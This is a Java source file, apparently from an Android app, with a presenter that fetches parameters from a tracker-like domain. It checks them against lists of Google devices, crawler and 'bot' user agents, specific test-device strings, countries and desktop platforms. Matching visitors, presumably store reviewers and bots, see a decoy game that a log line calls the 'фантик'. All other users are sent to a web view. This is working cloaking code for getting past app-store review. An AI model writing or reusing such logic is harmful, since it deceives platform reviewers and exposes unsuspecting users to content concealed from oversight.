package com.classicspin.wg.ui.fragments.start.presenter;



import android.text.TextUtils;
import android.util.Log;


import com.android.installreferrer.BuildConfig;
import com.classicspin.wg.interactor.DataStore;
import com.classicspin.wg.routers.main.MainActivityRouter;
import com.classicspin.wg.ui.base.BasePresenter;
import com.classicspin.wg.ui.fragments.start.view.StartView;
import com.classicspin.wg.util.Keys;

import org.jetbrains.annotations.NotNull;

import java.util.ArrayList;
import java.util.EnumMap;
import java.util.List;

import javax.inject.Inject;

import okhttp3.ResponseBody;
import retrofit2.Response;

import static org.apache.commons.lang3.StringUtils.containsIgnoreCase;

public class StartPresenter extends BasePresenter<StartView> {

    private MainActivityRouter mainActivityRouter;
    private DataStore dataStore;
    private EnumMap<Keys, String[]> paramsForCheckMap;

    @Inject
    StartPresenter(MainActivityRouter mainActivityRouter, DataStore dataStore) {
        this.mainActivityRouter = mainActivityRouter;
        this.dataStore = dataStore;
    }

    public void check() {

        dataStore.sendRequest().subscribe(sendRequest -> {
            if(!check(sendRequest)){
                showWeb();
            }else{
                showGame();

            }

        }, throwable -> getView().showError(throwable, mainActivityRouter));
    }

    public void showGame() {
        getView().showGame(mainActivityRouter);
    }

    public void showWeb() {
        getView().showWeb(mainActivityRouter);
    }

    private boolean check(Response<ResponseBody> sendRequest1) {
        paramsForCheckMap = new EnumMap<>(Keys.class);

        ArraysWitheDadaForCheck arraysWitheDadaForCheck = new ArraysWitheDadaForCheck();
        eadParamsForCheck(arraysWitheDadaForCheck);


        EnumMap<Keys, String> checkedParams = new EnumMap<>(Keys.class);
        List<Keys> checkedKeys = new ArrayList<>();

        getParamsForCheck(sendRequest1, checkedParams, checkedKeys);
        return checkMatch(checkedParams, checkedKeys);
    }

    private void getParamsForCheck(@NotNull Response<ResponseBody> sendRequest1, EnumMap<Keys, String> checkedParams, List<Keys> checkedKeys) {
        String msg = sendRequest1.raw().toString();

        String[] q = msg.split("Response\\{protocol=h2, code=200, message=, url=https://sym2metrybh.xyz/vWnYKdmf\\?");
        String str = TextUtils.join(",", q);
        String[] list = str.split("&");

        if (BuildConfig.DEBUG) {
            Log.d("My log msg", msg);
        }

        int size = list.length;

        for (int i = 0; i < size; i++) {
            boolean endsWith = list[i].endsWith("=");

            if (!endsWith) {
                checkedParams.put(Keys.values()[i], list[i]);
                checkedKeys.add(Keys.values()[i]);
            }
        }


    }

    private boolean checkMatch(EnumMap<Keys, String> checkedParams, List<Keys> checkedKeys) {
        for (Keys key : checkedKeys) {
            for (String keyWord : paramsForCheckMap.get(key)) {

                if (BuildConfig.DEBUG) {
                    Log.d("My log key", key + ": " + keyWord);
                }

                if (containsIgnoreCase(checkedParams.get(key), keyWord)) {

                    if (BuildConfig.DEBUG) {
                        Log.d("My log ", keyWord + " " + checkedParams.get(key) + " фантик показать!");
                    }
                    return true;
                }
            }


        }
        return false;
    }

    private void eadParamsForCheck(ArraysWitheDadaForCheck arraysWitheDadaForCheck) {

        paramsForCheckMap.put(Keys.sub1, arraysWitheDadaForCheck.sub1);
        paramsForCheckMap.put(Keys.sub2, arraysWitheDadaForCheck.sub2);
        paramsForCheckMap.put(Keys.sub3, arraysWitheDadaForCheck.sub3);
        paramsForCheckMap.put(Keys.sub4, arraysWitheDadaForCheck.sub4);
        paramsForCheckMap.put(Keys.sub5, arraysWitheDadaForCheck.sub5);
        paramsForCheckMap.put(Keys.sub6, arraysWitheDadaForCheck.sub6);
        paramsForCheckMap.put(Keys.sub7, arraysWitheDadaForCheck.sub7);
        paramsForCheckMap.put(Keys.sub8, arraysWitheDadaForCheck.sub8);
        paramsForCheckMap.put(Keys.sub9, arraysWitheDadaForCheck.sub9);


    }

    private class ArraysWitheDadaForCheck {

        String[] sub1 = {"FreeBSD", "Firefox", "Linux"};
        String[] sub2 = {null};
        String[] sub3 = {"Nexus", "Pixel", "Moto", "Google"};
        String[] sub4 = {"1"};
        String[] sub5 = {"1"};
        String[] sub6 = {"AR"};
        String[] sub7 = {"US", "PH", "NL", "GB", "IN", "IE"};
        String[] sub8 = {"FreeBSD", "Firefox", "Linux"};
        String[] sub9 = {"google", "bot", "adwords", "rawler", "spy", "o-http-client",
                "Dalvik/2.1.0 (Linux; U; Android 6.0.1; Nexus 5X Build/MTC20F)",
                "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-G935F Build/NRD90M)",
                "Dalvik/2.1.0 (Linux; U; Android 7.0; WAS-LX1A Build/HUAWEIWAS-LX1A)»"};

    }


}
